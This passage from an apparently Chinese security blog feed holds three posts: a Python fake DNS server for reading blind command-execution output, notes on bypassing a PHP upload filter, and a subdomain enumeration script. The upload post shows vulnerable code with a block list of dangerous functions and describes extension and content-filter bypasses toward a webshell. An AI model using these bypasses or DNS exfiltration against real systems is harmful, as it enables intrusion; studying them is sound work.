funsociety.bat@gmail.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明：</span></span><br><span class="line"><span class="comment"># 没有 DNSLog 功能强大，一个轻便型 伪DNS 服务器</span></span><br><span class="line"><span class="comment"># 可以配合 nslookup 命令 显示没有回显类漏洞的命令执行结果</span></span><br><span class="line"><span class="comment"># 不能实现真正的DNS解析，直接打印请求的IP，Port和需要解析的域名</span></span><br><span class="line"><span class="comment"># 说白了就是一个UDP的socket绑定在53端口循环接收DNS请求信息并格式化输出 xD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DNSQuery</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">    DNS请求解析类</span><br><span class="line">    from http://code.activestate.com/recipes/491264-mini-fake-dns-server/</span><br><span class="line">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        self.data = data</span><br><span class="line">        self.domain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">        tipo = (ord(data[<span class="number">2</span>]) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">15</span>   <span class="comment"># Opcode bits</span></span><br><span class="line">        <span class="keyword">if</span> tipo == <span class="number">0</span>:                     <span class="comment"># Standard query</span></span><br><span class="line">            ini = <span class="number">12</span></span><br><span class="line">            lon = ord(data[ini])</span><br><span class="line">            <span class="keyword">while</span> lon != <span class="number">0</span>:</span><br><span class="line">                self.domain += data[ini+<span class="number">1</span>:ini+lon+<span class="number">1</span>]+<span class="string">'.'</span></span><br><span class="line">                ini += lon+<span class="number">1</span></span><br><span class="line">                lon = ord(data[ini])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage:  python fake_dns_server.py"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"并没有提供DNS解析功能，直接打印发起请求的IP，Port和需要解析的域名 :P"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_dns_query</span><span class="params">(data, addr)</span>:</span></span><br><span class="line">    p=DNSQuery(data)</span><br><span class="line">    ip = addr[<span class="number">0</span>]</span><br><span class="line">    port = addr[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'From &#123;&#125;:&#123;&#125; DNSQuery -&gt; &#123;&#125;'</span>.format(ip,port,p.domain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) <span class="comment"># 创建一个UDP IPv4型 Socket</span></span><br><span class="line">        udps.bind((<span class="string">''</span>, <span class="number">53</span>))  <span class="comment"># 绑定 53 端口</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Failed to create socket on UDP port 53:"</span>, e</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\nFake DNS Server Started &gt; ... \n'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data, addr = udps.recvfrom(<span class="number">1024</span>)</span><br><span class="line">            thread.start_new_thread(print_dns_query, (data, addr))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n^C, Exit!'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\nError: %s'</span> % e</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        udps.close()</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks" target="_blank" rel="external">https://ricterz.me/posts/%E7%AC%94%E8%AE%B0:%20Data%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks</a></p>
</li>
<li><p><a href="http://code.activestate.com/recipes/491264-mini-fake-dns-server/" target="_blank" rel="external">http://code.activestate.com/recipes/491264-mini-fake-dns-server/</a></p>
</li>
<li><p><a href="http://serverfault.com/questions/448541/how-to-know-who-ping-my-computer" target="_blank" rel="external">http://serverfault.com/questions/448541/how-to-know-who-ping-my-computer</a></p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近研究了类似盲注类命令执行没有回显的情况的处理方式，听了No老师的一些实战经验，手动搭建了DNSLog程序和一个简易的DNSServer，
    
    </summary>
    
    
      <category term="DNSLog" scheme="http://www.evilclay.com/tags/DNSLog/"/>
    
      <category term="DNSServer" scheme="http://www.evilclay.com/tags/DNSServer/"/>
    
  </entry>
  
  <entry>
    <title>一次文件上传绕过笔记</title>
    <link href="http://www.evilclay.com/2017/01/03/%E4%B8%80%E6%AC%A1%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.evilclay.com/2017/01/03/一次文件上传绕过笔记/</id>
    <published>2017-01-02T16:34:46.000Z</published>
    <updated>2017-01-04T16:47:50.529Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>No老师之前给了个 PHP 上传脚本，正好趁着晚上没事做研究了一下。<br>因为这次直接拿到了源代码，绕过的过程思路很清晰，倒是真正绕过后感觉看上去写的挺”严谨”的代码深挖下去总会有 Bug 的，除此之外，学习到一些很有用的东西，特地记录下。</p>
<h2 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h2><p>先贴出上传代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = end(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line"><span class="keyword">if</span>($str!=<span class="string">"php"</span> <span class="keyword">and</span> $str!=<span class="string">"asp"</span> <span class="keyword">and</span> $str!=<span class="string">"jsp"</span> <span class="keyword">and</span> $str!=<span class="string">"aspx"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $str=file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    $pre = <span class="string">"/(\&lt;\? |\?\&gt;|\&lt;\%|[$]_GET|[$]_POST|[$]_COOKIE|passthru|open|[$]_FILES|system|eval|exec|assert)/i"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pre,$str))</span><br><span class="line">    &#123;<span class="keyword">echo</span> <span class="string">'WTF!'</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// echo $_FILES["file"]["tmp_name"];</span></span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"$str error"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>自己本地写了个表单，用来提交上传请求 index.html:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>File Upload Bypass Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析 upload.php 的源码，可以看出首先会对上传文件的后缀名做黑名单过滤，然后对上传文件的内容进行过滤，所以Fuzz的时候主要是解决这两个问题。</p>
<h3 id="绕过后缀名过滤"><a href="#绕过后缀名过滤" class="headerlink" title="绕过后缀名过滤"></a>绕过后缀名过滤</h3><p>这个比较简单，使用 Burp 代理请求，在后缀名后面多输入一个空格就可以。<br>上传 fuck.php 的时候 burp 拦截，修改成如下：</p>
<p>修改后可以绕过 upload.php 中对后缀名的检查，同时不影响文件的生成(move_uploaded_file)。</p>
<h3 id="绕过文本内容过滤"><a href="#绕过文本内容过滤" class="headerlink" title="绕过文本内容过滤"></a>绕过文本内容过滤</h3><p>首先要知道上传可以执行的一句话木马（脚本）需要的必要条件：</p>
<ol>
<li>能被 PHP 引擎（Zend Engine）解析执行（PHP环境）。</li>
<li>脚本中有用户可以控制的输入点。</li>
<li>用户输入的数据能够被当做 PHP代码执行。</li>
</ol>
<p>说白了，可以归纳为两点：1,用户能控制输入 2, 输入的数据能够当做代码解析。<br>有这两点就写个 shell 就已经足够了。</p>
<p>之所以在这里分成3点，原因我会从源码的角度对这三点进行分析，并给出对应的绕过方案。</p>
<h4 id="构造PHP环境"><a href="#构造PHP环境" class="headerlink" title="构造PHP环境"></a>构造PHP环境</h4><p>因为正则表达式中<code>\&lt;\? |\?\&gt;|\&lt;\%|</code>这段代码的存在导致无法正常定义 PHP 脚本，所以，可以用这种方法定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt; PHP 代码 &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="插入用户可以控制的输入点"><a href="#插入用户可以控制的输入点" class="headerlink" title="插入用户可以控制的输入点"></a>插入用户可以控制的输入点</h4><p>因为 <code>[$]_GET|[$]_POST|[$]_COOKIE</code> 都已经被过滤，所以无非找找其他的输入接收关键字有没有过滤，或者换一种方式（感觉应该会有，我没想到），在这里突然想到了没有过滤 REQUEST 方法，随意直接用 REQUEST 构造 一句话就可以了。</p>
<h4 id="让数据可以在服务端当做PHP代码执行"><a href="#让数据可以在服务端当做PHP代码执行" class="headerlink" title="让数据可以在服务端当做PHP代码执行"></a>让数据可以在服务端当做PHP代码执行</h4><p>因为 <code>passthru|open|[$]_FILES|system|eval|exec|assert</code> 这些危险函数直接被 ban 了，所以要想办法绕过，</p>
<p>———————–  放着，这个坑以后填上  —————————</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;No老师之前给了个 PHP 上传脚本，正好趁着晚上没事做研究了一下。&lt;br&gt;因为这次直接拿到了源代码，绕过的过程思路很清晰，倒是真正绕过后感
    
    </summary>
    
    
      <category term="文件上传" scheme="http://www.evilclay.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>DomainSeeker 多方式收集目标子域名信息</title>
    <link href="http://www.evilclay.com/2017/01/02/domain-seeker%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E8%84%9A%E6%9C%AC/"/>
    <id>http://www.evilclay.com/2017/01/02/domain-seeker二级域名收集脚本/</id>
    <published>2017-01-02T06:34:07.000Z</published>
    <updated>2017-01-02T06:45:46.364Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参照猪猪侠的 wydomain 项目写一个简单的二级域名查找的脚本，提供三种方式来收集目标的子域名信息。</p>
<ul>
<li>DNS枚举</li>
<li>搜索引擎结果</li>
<li>子域名查询接口</li>
</ul>
<p>并且综合三种方式收集的子域名进行去重处理。</p>
<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>程序帮助</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">usage: domain_seeker.py [-h] [-t NUM] [-d DOMAIN] [-b] [-s] [-a]</span><br><span class="line"></span><br><span class="line">Multi-method SubDomain Seeker</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message <span class="keyword">and</span> exit</span><br><span class="line">  -t NUM, --thread NUM  thread count</span><br><span class="line">  -d DOMAIN, --domain DOMAIN</span><br><span class="line">                        target doamin</span><br><span class="line">  -b, --bruteforce      dns bruteforce</span><br><span class="line">  -s, --search          search engine</span><br><span class="line">  -a, --api             domain finder api</span><br></pre></td></tr></table></figure>
<p>测试收集 swu.edu.cn 的所有域名，可以看到经过去重后还有282个子域名条目。</p>
<p><img src="http://7xku36.com1.z0.glb.clouddn.com/domain_seeker_demo.png" alt=""></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="comment"># author: Anka9080</span></span><br><span class="line"><span class="comment"># email: funsociety.bat@gmail.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"><span class="keyword">import</span> dns.rdatatype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    level=logging.INFO, </span><br><span class="line">    format=<span class="string">'%(asctime)s [%(levelname)s] %(message)s'</span>,</span><br><span class="line">)</span><br><span class="line">logging.getLogger(<span class="string">"requests"</span>).setLevel(logging.WARN)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域名服务器</span></span><br><span class="line">NAMESERVERS = [</span><br><span class="line">    <span class="string">'114.114.114.114'</span>,</span><br><span class="line">    <span class="string">'119.29.29.29'</span>,</span><br><span class="line">    <span class="string">'223.5.5.5'</span>,</span><br><span class="line">    <span class="string">'8.8.8.8'</span>,</span><br><span class="line">    <span class="string">'182.254.116.116'</span>,</span><br><span class="line">    <span class="string">'223.6.6.6'</span>,</span><br><span class="line">    <span class="string">'8.8.4.4'</span>,</span><br><span class="line">    <span class="string">'180.76.76.76'</span>,</span><br><span class="line">    <span class="string">'216.146.35.35'</span>,</span><br><span class="line">    <span class="string">'123.125.81.6'</span>,</span><br><span class="line">    <span class="string">'218.30.118.6'</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileUtils</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getLines</span><span class="params">(filename)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(filename) <span class="keyword">as</span> fn:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> fn.readlines():</span><br><span class="line">                <span class="keyword">yield</span> line.strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 域名基类(提供解析相关的功能函数)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Domain</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,nameservers=[],timeout=<span class="string">''</span>)</span>:</span></span><br><span class="line">        self.resolver = dns.resolver.Resolver()</span><br><span class="line">        <span class="keyword">if</span> nameservers: self.resolver.nameservers = nameservers</span><br><span class="line">        <span class="keyword">if</span> timeout: self.resolver.timeout = timeout</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取泛解析的IP列表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extensive</span><span class="params">(self,target)</span>:</span></span><br><span class="line">        test_domains = [<span class="string">'Anka9080_&#123;0&#125;.&#123;1&#125;'</span>.format(i,target) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>)]</span><br><span class="line">        <span class="comment"># print '-- test_domains:',test_domains</span></span><br><span class="line">        e_ips = []</span><br><span class="line">        <span class="keyword">for</span> domain <span class="keyword">in</span> test_domains:</span><br><span class="line">            record = self.query(domain,<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">if</span> record <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                e_ips.extend(record[<span class="string">'A'</span>])</span><br><span class="line">        <span class="keyword">return</span> e_ips</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析域名</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self,target,rdtype)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            answer = self.resolver.query(target, rdtype)</span><br><span class="line">            <span class="keyword">return</span> self.parser(answer)</span><br><span class="line">        <span class="keyword">except</span> dns.resolver.NoAnswer:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span> <span class="comment"># catch the except, nothing to do</span></span><br><span class="line">        <span class="keyword">except</span> dns.resolver.NXDOMAIN:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">None</span> <span class="comment"># catch the except, nothing to do</span></span><br><span class="line">        <span class="keyword">except</span> dns.resolver.Timeout:</span><br><span class="line">            <span class="comment"># timeout retry</span></span><br><span class="line">            print(target, rdtype, <span class="string">'&lt;timeout&gt;'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">raise</span> e</span><br><span class="line">            logging.info(str(e))</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parser</span><span class="params">(self, answer)</span>:</span></span><br><span class="line">        <span class="string">"""result relationship only two format </span><br><span class="line">        @domain     domain name</span><br><span class="line">        @address    ip address</span><br><span class="line">        """</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> rrsets <span class="keyword">in</span> answer.response.answer:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> rrsets.items:</span><br><span class="line">                rdtype = self.get_type_name(item.rdtype)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> item.rdtype == self.get_type_id(<span class="string">'A'</span>):</span><br><span class="line">                    <span class="keyword">if</span> result.has_key(rdtype):</span><br><span class="line">                        